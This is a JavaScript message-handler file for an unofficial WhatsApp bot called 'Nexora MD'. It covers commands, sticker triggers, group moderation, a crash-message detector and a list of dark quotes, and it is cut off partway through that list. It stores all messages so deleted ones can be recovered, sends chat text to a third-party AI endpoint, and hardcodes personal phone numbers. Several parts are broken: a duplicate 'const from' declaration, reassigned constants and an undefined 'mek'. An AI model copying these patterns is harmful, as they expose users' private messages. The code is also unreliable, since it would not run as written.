require('./setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");
const runtimeUsage = require("./runtimeUsage");
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const didyoumean = require('didyoumean');
const similarity = require('similarity');

// Cache the case names for the suggestion system
let caseNames = [];
try {
    const data = fs.readFileSync('./case.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);
    if (matches) {
        caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    }
} catch (err) {
    console.error('Error loading cases for didyoumean:', err);
}


//const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const ram = runtimeUsage();
const timestampp = speed();
const jimp = require("jimp")
//const readMore = more.repeat(4001);
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const axios = require('axios');
const ytdl = require('@vreden/youtube_scraper');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
const richpic = fs.readFileSync(`./media/image1.jpg`)

//const fs = require('fs');
const path = require('path');

const getRandomImage = (directory) => {
    if (!fs.existsSync(directory)) {
        console.log(chalk.red(`Directory not found: ${directory}`));
        return null; 
    }
    const files = fs.readdirSync(directory).filter(file => /\.(jpg|jpeg|png|webp)$/i.test(file));
    if (files.length === 0) return null;
    const randomFile = files[Math.floor(Math.random() * files.length)];
    return path.join(directory, randomFile);
};


const numberEmojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];
// At the very top of your index.js or main bot file
//const tictactoeGames = {}; // Stores ongoing Tic-Tac-Toe games per chat
const hangmanGames = {};   // Stores ongoing Hangman games per chat
const hangmanVisual = [
    "😃🪓______", // 6 attempts left
    "😃🪓__|____",
    "😃🪓__|/___",
    "😃🪓__|/__",
    "😃🪓__|/\\_",
    "😃🪓__|/\\_", 
    "💀 Game Over!" // 0 attempts left
];
const { getSetting, setSetting } = require("./setting/Settings.js")
const groupCache = new Map(); // Cache group metadata

module.exports = empire = async (empire, m, chatUpdate, store) => {
const { from } = m
try {
      

const body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :

    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :

    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :


    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :

    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[Pesan sekali lihat]") :

    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[Pesan sementara]") :

    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';
const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'))




const isCmd = body.startsWith(prefix);
const args = body.slice(prefix.length).trim().split(/ +/); // everything after the dot
const command = args.shift().toLowerCase(); // first word is the command
const text = args.join(" ")
const botNumber = await empire.decodeJid(empire.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
// ====== PUBLIC / PRIVATE LOCK ======
try {
    const fs = require('fs');
    const path = require('path');
    const configPath = path.join(__dirname, 'database', 'bot_config.json');

    let isPrivate = true; // Safe default: true means private

    if (fs.existsSync(configPath)) {
        const fileData = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
        if (typeof fileData.selfMode !== 'undefined') {
            isPrivate = fileData.selfMode;
        }
    }

    // If the bot is private, the user is NOT the owner, and they try to use a command:
    if (isPrivate && !isCreator && body.startsWith(prefix) && prefix !== '') {
        return; // Ignore them completely and stop running the code
    }
} catch (err) {
    console.error("Lock system error:", err);
}
// ===================================

// --- DYNAMIC NEXORA SMART BRIDGE ---
const isNex = body.toLowerCase().includes('nex') || (m.mentionedJid && m.mentionedJid.includes(botNumber));

if (isNex && !isCmd) {
    try {
        // 1. Auto-scan this file for all 'case' keywords
        const fileContent = fs.readFileSync(__filename, 'utf8');
        const caseRegex = /case\s+['"]([^'"]+)['"]\s*:/g;
        let match;
        const autoCommands = [];
        while ((match = caseRegex.exec(fileContent)) !== null) {
            autoCommands.push(match[1].toLowerCase());
        }

        // 2. Clean the input (remove tags and the name 'nex')
        const cleanInput = body.replace(/@\d+/g, '').replace(/nex/gi, '').toLowerCase().trim();
        const words = cleanInput.split(/\s+/);

        // 3. Smart Find: Look for any valid command word inside the sentence
        const foundCommand = autoCommands.find(cmd => words.includes(cmd));

        if (foundCommand) {
            command = foundCommand; 
            args = words.filter(w => w !== foundCommand);
            q = args.join(' ');
            isCmd = true;
            await empire.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        }
    } catch (err) {
        console.error("Nexora Bridge Error:", err);
    }
}
const authorizedNumbers = ["2349118304002@s.whatsapp.net", "2349168095230@s.whatsapp.net"];

// 3. THIRD: Load Premium Data safely
let PremiumData = [];
try {
    PremiumData = JSON.parse(fs.readFileSync('./allfunc/premium.json'));
} catch (e) {
    PremiumData = [];
}

// 4. FOURTH: Now you can safely check isPremium because isCreator exists!
const isPremium = authorizedNumbers.includes(m.sender) || 
                  isCreator || 
                  PremiumData.some(p => p.id === m.sender && Date.now() < p.expire);
                  

const qtext = q = args.join(" ")
const tempMailData = {};
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await empire.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : true
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : true
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
//const todayDateWIB = new Date().toLocaleDateString('id-ID', {
//  timeZone: 'Asia/Jakarta',
 // year: 'numeric',
//  month: 'long',
 // day: 'numeric',
//});
const bubbleCharMap = {
    'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ',
    'k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ',
    'u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ',
    'A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ',
    'K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ',
    'U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'
};
const glitchCharMap = {
    'a':'̷a','b':'̷b','c':'̷c','d':'̷d','e':'̷e','f':'̷f','g':'̷g','h':'̷h','i':'̷i',
    'j':'̷j','k':'̷k','l':'̷l','m':'̷m','n':'̷n','o':'̷o','p':'̷p','q':'̷q','r':'̷r',
    's':'̷s','t':'̷t','u':'̷u','v':'̷v','w':'̷w','x':'̷x','y':'̷y','z':'̷z',
    'A':'̷A','B':'̷B','C':'̷C','D':'̷D','E':'̷E','F':'̷F','G':'̷G','H':'̷H','I':'̷I',
    'J':'̷J','K':'̷K','L':'̷L','M':'̷M','N':'̷N','O':'̷O','P':'̷P','Q':'̷Q','R':'̷R',
    'S':'̷S','T':'̷T','U':'̷U','V':'̷V','W':'̷W','X':'̷X','Y':'̷Y','Z':'̷Z'
};
const fancyCharMap = {
    'a': '𝒜', 'b': 'ℬ', 'c': '𝒞', 'd': '𝒟', 'e': 'ℰ', 'f': 'ℱ', 'g': '𝒢',
    'h': 'ℋ', 'i': 'ℐ', 'j': '𝒥', 'k': '𝒦', 'l': 'ℒ', 'm': 'ℳ', 'n': '𝒩',
    'o': '𝒪', 'p': '𝒫', 'q': '𝒬', 'r': 'ℛ', 's': '𝒮', 't': '𝒯', 'u': '𝒰',
    'v': '𝒱', 'w': '𝒲', 'x': '𝒳', 'y': '𝒴', 'z': '𝒵',
    'A': '𝒜', 'B': 'ℬ', 'C': '𝒞', 'D': '𝒟', 'E': 'ℰ', 'F': 'ℱ', 'G': '𝒢',
    'H': 'ℋ', 'I': 'ℐ', 'J': '𝒥', 'K': '𝒦', 'L': 'ℒ', 'M': 'ℳ', 'N': '𝒩',
    'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': 'ℛ', 'S': '𝒮', 'T': '𝒯', 'U': '𝒰',
    'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
};
const toAkatsukiFont = (text) => {
  const fontMap = {
    'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃',
    'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈', 'N': '𝙉', 'O': '𝙊', 'P': '𝙋',
    'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓',
    'Y': '𝙔', 'Z': '𝙕',
    'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝',
    'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢', 'n': '𝙣', 'o': '𝙤', 'p': '𝙥',
    'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭',
    'y': '𝙮', 'z': '𝙯',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳',
    '8': '𝟴', '9': '𝟵'
  };
  return text.split('').map(char => fontMap[char] || char).join('');
};
// ==================== STICKER COMMAND SYSTEM ====================
const STICKER_CMDS_FILE = './database/sticker_cmds.json';

function loadStickerCommands() {
    const fs = require('fs');
    if (!fs.existsSync(STICKER_CMDS_FILE)) {
        const path = require('path');
        const dir = path.dirname(STICKER_CMDS_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        
        fs.writeFileSync(STICKER_CMDS_FILE, JSON.stringify({}));
    }
    try {
        return JSON.parse(fs.readFileSync(STICKER_CMDS_FILE));
    } catch (e) {
        return {};
    }
}

function saveStickerCommands(data) {
    const fs = require('fs');
    fs.writeFileSync(STICKER_CMDS_FILE, JSON.stringify(data, null, 2));
}

function setStickerCommand(stickerId, commandName) {
    const data = loadStickerCommands();
    data[stickerId] = commandName;
    saveStickerCommands(data);
}

function getStickerCommand(stickerId) {
    const data = loadStickerCommands();
    return data[stickerId] || null;
}

// ANTI-BUG SYSTEM (Auto-Detection)
const isAntiBug = false; // using false so it won't disturb if not needed 🌚 
if (m.isGroup && isAntiBug && !isAdmins && !isCreator) {
    // Detects messages that are unusually long or contain known crash characters
    if (m.text.length > 5000 || m.mtype === 'viewOnceMessageV2' && m.text.length > 2000) {
        console.log(chalk.redBright(`[BUG DETECTED] From: ${m.sender} in ${groupName}`));
        
        // 1. Delete the bug message
        await empire.sendMessage(m.chat, { delete: m.key });
        
        // 2. Warn or Kick the sender
        await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        
        // 3. Notify the group
        return empire.sendMessage(m.chat, { 
            text: toAkatsukiFont(`🛡️ NEXORA ANTI-BUG\n\nA crash-message was detected and neutralized. Sender has been removed.`) 
        });
    }
}


// --- NEXORA ANTI GROUP STATUS MENTION (WARN, DELETE, KICK) ---
// ====== STICKER COMMAND ROUTING HOOK ======
if (m.mtype === 'stickerMessage') {
    const fs = require('fs');
    const path = './database/sticker_cmds.json';

    if (fs.existsSync(path)) {
        try {
            const stickerDb = JSON.parse(fs.readFileSync(path, 'utf-8'));
            
            // Extract hash from incoming sticker payload
            const incomingHash = m.msg.fileSha256 
                ? Buffer.from(m.msg.fileSha256).toString('base64') 
                : null;

            if (incomingHash && stickerDb[incomingHash]) {
                // Match found! Override the command execution variable
                const linkedCmd = stickerDb[incomingHash];
                
                // Simulate the command text so your main switch-case catches it cleanly
                body = prefix + linkedCmd; 
                command = linkedCmd;
                
                // Log the trigger internally inside the console log pipelines
                console.log(`[ STICKER CMD ] Triggered ${prefix + linkedCmd} via Hash Match.`);
            }
        } catch (err) {
            console.error("Sticker Hook Error:", err);
        }
    }
}
// ============ STICKER COMMAND EXECUTOR ============
// ==================================================
// PLACE IT HERE - ABSOLUTE TOP OF THE HANDLER
// ==================================================
if (m.mtype === 'stickerMessage') {
    try {
        const targetMessage = m.msg || m;
        const stickerHash = targetMessage.fileSha256 
            ? Buffer.from(targetMessage.fileSha256).toString('base64') 
            : null;
        
        if (stickerHash) {
            const linkedCommand = getStickerCommand(stickerHash);
            
            if (linkedCommand) {
                console.log(`🎯 Sticker command triggered: ${linkedCommand}`);
                
                // We force the text variables to match BEFORE any other code parses it
                body = prefix + linkedCommand; 
                
                await empire.sendMessage(m.chat, { react: { text: '🎯', key: m.key } });
            }
        }
    } catch (err) {
        console.error('Sticker executor hook error:', err);
    }
}

// ==================================================
// Your existing bot text parser should come AFTER the hook:
// ==================================================
// const command = body.startsWith(prefix) ? ...
// switch(command) { ... }


// ==========================================

if (m.isGroup && getSetting(m.chat, "antistatusmention", false)) {
    const message = m.message || {};
    
    // Check various ways WhatsApp hides status broadcast mentions
    const hasStatusMentionMessage = !!message.statusMentionMessage;
    const hasGroupStatusMention = !!message.groupStatusMentionMessage;
    
    const contextInfo =
        message.extendedTextMessage?.contextInfo ||
        message.imageMessage?.contextInfo ||
        message.videoMessage?.contextInfo ||
        message.stickerMessage?.contextInfo ||
        message.documentMessage?.contextInfo ||
        message.audioMessage?.contextInfo ||
        message.messageContextInfo?.contextInfo ||
        null;

    const mentionedJids = contextInfo?.mentionedJid || [];
    const quotedParticipant = contextInfo?.participant || '';
    const hasStatusBroadcastMention =
        mentionedJids.includes('status@broadcast') ||
        quotedParticipant === 'status@broadcast' ||
        (contextInfo?.remoteJid === 'status@broadcast');

    // Triggered if any match is true
    if (hasStatusMentionMessage || hasGroupStatusMention || hasStatusBroadcastMention) {
        // BYPASS PROTECTION: Ignore if sender is Owner/Creator or an Admin
        if (isCreator || isAdmins || m.key.fromMe) return;

        console.log(`[ANTISTATUSMENTION] Triggered by ${sender} in ${m.chat}`);

        // 1. DELETE: Instantly vaporize the offending mention
        if (isBotAdmins) {
            try {
                await empire.sendMessage(m.chat, { 
                    delete: { 
                        remoteJid: m.chat, 
                        fromMe: false, 
                        id: m.key.id, 
                        participant: sender 
                    } 
                });
            } catch (e) {
                console.error("Failed to delete status mention:", e.message);
            }

            // 2. WARN: Send a public declaration tracking the execution
            await empire.sendMessage(m.chat, {
                text: `🛡️ *NEXORA ANTI STATUS MENTION*\n\n⚠️ @${sender.split('@')[0]} has violated safety codes by targeting this group via Status Broadcast Mentions.\n\n❌ *Action Executed:* Message Purged & User Expelled from system.`,
                mentions: [sender]
            });

            // 3. KICK: Immediately remove from group participants
            try {
                await empire.groupParticipantsUpdate(m.chat, [sender], 'remove');
            } catch (e) {
                console.error("Failed to remove user for status mention:", e.message);
            }
        }
        return; // Halt further processing of this message inside the thread
    }
}

// --- [ ELITE USER REACTION ENGINE ] ---
if (m.isGroup && !isCmd) {
    // List of priority target WhatsApp IDs
    const crownNumbers = [
        '2349118304002@s.whatsapp.net',
        '2349168095230@s.whatsapp.net'
    ];

    // If the sender's ID matches anyone in the array, drop the crown reaction
    if (crownNumbers.includes(m.sender)) {
        try {
            await empire.sendMessage(m.chat, { 
                react: { 
                    text: '📝', 
                    key: m.key 
                } 
            });
        } catch (e) {
            console.log("Reaction Failed:", e);
        }
    }
}

// --- TAG-STYLE CHATBOT WITH MEMORY ---
// --- TAG-STYLE CHATBOT LOGIC ---
const isChatbot = getSetting(m.chat, 'chatbot'); 

// 1. Logic Check: Must be ON, NOT a command, NOT from the bot itself, and MUST be a reply to the bot
if (isChatbot && !isCmd &&  m.quoted && m.quoted.sender === botNumber) {
    
    // Add reaction to acknowledge message
    await empire.sendMessage(m.chat, { react: { text: '💬', key: m.key } });
    
    try {
        const axios = require('axios');
        
        // TRAINING: Personality of the bot
        const training = "Your name is Nexora md  Bot. your owner is Empire Tech, He's a Nigerian JavaScript programmer bot developer also he owns Nexora md empire XD and Akira md and website developer,You are smart and helpful you can help brainstorm, do research, help with coding and any fun talk sometimes you use emojis to make chats lively only say your info when you are asked only";
        const fullQuery = `System: ${training}\nUser: ${body}`;
        
        const aiUrl = `https://omegatech-api.dixonomega.tech/api/ai/Claude?text=${encodeURIComponent(fullQuery)}`;
        const response = await axios.get(aiUrl);
        
        if (response.data && response.data.result) {
            const aiReply = response.data.result;
            
            // Format: @user [newline] Message Body
            const taggedMessage = `@${m.sender.split('@')[0]}\n\n${aiReply}`;

            await empire.sendMessage(m.chat, { 
                text: taggedMessage, 
                mentions: [m.sender], // This makes the @ tag actually blue and clickable
                contextInfo: { 
                    // We remove 'quoted' here so it doesn't show the small message box
                    externalAdReply: {
                        title: "EMPIRE CHATBOT",
                        body: "Responding...",
                        thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg", 
                        sourceUrl: "https://github.com/DixonOmega",
                        mediaType: 1,
                        renderLargerThumbnail: false
                    }
                }
            }); 
        }
    } catch (err) {
        console.error("Chatbot Error:", err);
    }
}

const { AntiDelete, toggleAntiDelete } = require('./allfunc/antideleteFriend');

if (!empire._antiDeleteAttached) {
    empire._antiDeleteAttached = true;
    empire.ev.on('messages.update', async (updates) => {
        await AntiDelete(empire, updates);
    });
    console.log('✅ Anti-delete listener attached');
}
const nexoraMark = '💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †💧'
const { saveMessage } = require('./allfunc/data');
// Inside your message or group participants update listener
empire.ev.on('messages.upsert', async (chatUpdate) => {
    const m = chatUpdate.messages[0];
    if (!m.message) return;

    // Check if the message is a "Group Mentioned in Status" stub type
    // This is the new WhatsApp update detection
    if (m.messageStubType === 91) { // 91 is often the stub for group mention notifications
        const groupJid = m.key.remoteJid;
        const participant = m.participant || m.key.participant;

        console.log(`Detected Group Mention from: ${participant}`);

        // 1. Delete the notification message immediately
        await empire.sendMessage(groupJid, { 
            delete: { 
                remoteJid: groupJid, 
                fromMe: false, 
                id: m.key.id, 
                participant: participant 
            } 
        });

        // 2. Send a warning or take action
        await empire.sendMessage(groupJid, { 
            text: `⚠️ *Anti-Group Mention*\n\n@${participant.split('@')[0]}, tagging this group in your status is not allowed. The notification has been removed.`,
            mentions: [participant]
        });
    }
});

empire.ev.on('messages.upsert', async ({ messages }) => {
    for (const m of messages) {
        if (!m.key?.id) continue;

        saveMessage(m.key.id, m, m.key.remoteJid);
    }
});

// --- NEXORA GLOBAL QUOTES (130 DARK & DOMINANT) ---



const nexoraQuotesList = [
    "Even the devil was once an angel. — †Sir Demon†",
    "Hell is empty and all the devils are here. — William Shakespeare",
    "I’d rather reign in Hell than serve in Heaven. — John Milton",
    "The silence is louder than the screams. — †Sir Demon†",
    "Dead men tell no tales, but their shadows do. — †Sir Demon†",
    "Welcome to my personal purgatory. — †Sir Demon†",
    "I don't fear the dark; I own it. — †Sir Demon†",
    "Burn the bridge and use the light to find your way. — †Sir Demon†",
    "Not a monster, just ahead of the curve. — The Joker",
    "Your nightmares are my reality. — †Sir Demon†",
    "𝔈𝔫𝔡 𝔬𝔣 𝔇𝔞𝔶𝔰. — †Sir Demon†",
    "Born to burn. — †Sir Demon†",
    "Legacy in ashes. — †Sir Demon†",
    "𝕿𝖍𝖊 𝖁𝖔𝖎𝖉 𝖂𝖆𝖙𝖈𝖍𝖊𝖘. — †Sir Demon†",
    "No exits. — †Sir Demon†",
    "Hell is other people. — Jean-Paul Sartre",
    "The devil's finest trick is to persuade you that he does not exist. — Charles Baudelaire",
    "We are each our own devil, and we make this world our hell. — Oscar Wilde",
    "Monsters are real, and ghosts are real too. They live inside us. — Stephen King",
    "Battle not with monsters, lest ye become a monster. — Friedrich Nietzsche",
    "In the land of the dark, the one-eyed man is king. — †Sir Demon†",
    "God is not here today. — †Sir Demon†",
    "If you’re going through hell, keep going. — Winston Churchill",
    "Evil is just a point of view. — Anne Rice",
    "Sometimes the only way to see the light is to embrace the dark. — †Sir Demon†",
    "The devil is an optimist if he thinks he can make people worse. — Karl Kraus",
    "Forgive your enemies, but never forget their names. — J.F. Kennedy",
    "A wolf in sheep's clothing is still a wolf. — †Sir Demon†",
    "The crown of thorns is more comfortable than the crown of gold. — †Sir Demon†",
    "I am the storm that is approaching. — †Sir Demon†",
    "Power is not given, it is taken. — †Sir Demon†",
    "Sit on your throne of lies until I burn it down. — †Sir Demon†",
    "I don't play the game; I break the board. — †Sir Demon†",
    "Don't pray for an easy life, pray for the strength to endure. — Bruce Lee",
    "My mercy died a long time ago. — †Sir Demon†",
    "I am the glitch in your perfect reality. — †Sir Demon†",
    "To find peace, you must first prepare for war. — †Sir Demon†",
    "Your gods cannot hear you here. — †Sir Demon†",
    "Dominance is a quiet room. — †Sir Demon†",
    "I don't forgive. I wait. — †Sir Demon†",
    "Success is the best revenge, but destruction is more satisfying. — †Sir Demon†",
    "Rule the world or let it burn you. — †Sir Demon†",
    "They laughed at my dreams; now I laugh at their screams. — †Sir Demon†",
    "I am not in danger. I am the danger. — Walter White",
    "Eternal Echo. — †Sir Demon†",
    "𝔇𝔢𝔞𝔱𝔥 𝔦𝔰 𝔭𝔢𝔞𝔠𝔢. — †Sir Demon†",
    "Lost Souls. — †Sir Demon†",
    "Cold Blood. — †Sir Demon†",
    "Shadow Sovereign. — †Sir Demon†",
    "𝔐𝔬𝔯𝔱𝔞𝔩 𝔈批𝔯𝔬𝔯. — †Sir Demon†",
    "Dark Matter. — †Sir Demon†",
    "Silent King. — †Sir Demon†",
    "Bleed for me. — †Sir Demon†",
    "Chaos Reigns. — †Sir Demon†",
    "Null & Void. — †Sir Demon†",
    "Grim Reaper's Smile. — †Sir Demon†",
    "Dead Inside. — †Sir Demon†",
    "Ghost Protocol. — †Sir Demon†",
    "Omega. — †Sir Demon†",
    "Technology is the new god. — †Sir Demon†",
    "Delete the weak, update the strong. — †Sir Demon†",
    "My soul is encrypted. — †Sir Demon†",
    "Searching for humanity... 404 Not Found. — †Sir Demon†",
    "God is a programmer, and I am the virus. — †Sir Demon†",
    "The machine has no mercy. — †Sir Demon†",
    "Disconnected from reality. — †Sir Demon†",
    "Code is the only law. — †Sir Demon†",
    "Silicon heart, iron will. — †Sir Demon†",
    "Upgrade or expire. — †Sir Demon†",
    "Data never dies. — †Sir Demon†",
    "The screen is the only window left. — †Sir Demon†",
    "Artificial Intelligence, Real Hatred. — †Sir Demon†",
    "Hardware breaks, software haunts. — †Sir Demon†",
    "I am the ghost in your machine. — †Sir Demon†",
    "System Failure: Heart not detected. — †Sir Demon†",
    "Welcome to the Digital Hell. — †Sir Demon†",
    "Coded in blood, executed in shadows. — †Sir Demon†",
    "Binary is the language of the dead. — †Sir Demon†",
    "Neural link severed. — †Sir Demon†",
    "Hope is a waking dream. — Aristotle",
    "Man is the only animal that blushes. Or needs to. — Mark Twain",
    "The world is a stage, but the play is badly cast. — Oscar Wilde",
    "Existence is pain. — †Sir Demon†",
    "We are all walking each other home. — Ram Dass",
    "The price of greatness is responsibility. — Winston Churchill",
    "Nothing is true, everything is permitted. — Hassan-i Sabbah",
    "Life is a comedy in long-shot. — Charlie Chaplin",
    "To live is to suffer. — Friedrich Nietzsche",
    "Escape the ranks of the insane. — Marcus Aurelius",
    "The abyss also gazes into you. — Friedrich Nietzsche",
    "Life is what happens while making other plans. — John Lennon",
    "Man is condemned to be free. — Jean-Paul Sartre",
    "The only true wisdom is knowing you know nothing. — Socrates",
    "Do not go gentle into that good night. — Dylan Thomas",
    "Death is the only thing that makes life worth living. — †Sir Demon†",
    "The truth is rarely pure and never simple. — Oscar Wilde",
    "Don't look back; you're not going that way. — †Sir Demon†",
    "The end is near, and it is beautiful. — †Sir Demon†",
    "I am the architect of my own destruction. — †Sir Demon†",
    "Beware the quiet man. — †Sir Demon†",
    "Your time is a currency you can't earn back. — †Sir Demon†",
    "The darkness is just a lack of lies. — †Sir Demon†",
    "I have no master. — †Sir Demon†",
    "Leave your ego at the gates of hell. — †Sir Demon†",
    "A king without a kingdom is still a king. — †Sir Demon†",
    "No gods, no masters. — Anarchist Proverb",
    "Suffer now and live as a champion. — Muhammad Ali",
    "The devil finds work for idle hands. — Proverb",
    "Better to die on your feet than live on your knees. — Emiliano Zapata",
    "Knowledge is the only weapon that can't be taken. — †Sir Demon†",
    "Trust is a luxury I can't afford. — †Sir Demon†",
    "The sun sets on every empire. — †Sir Demon†",
    "Fear is the mind-killer. — Frank Herbert",
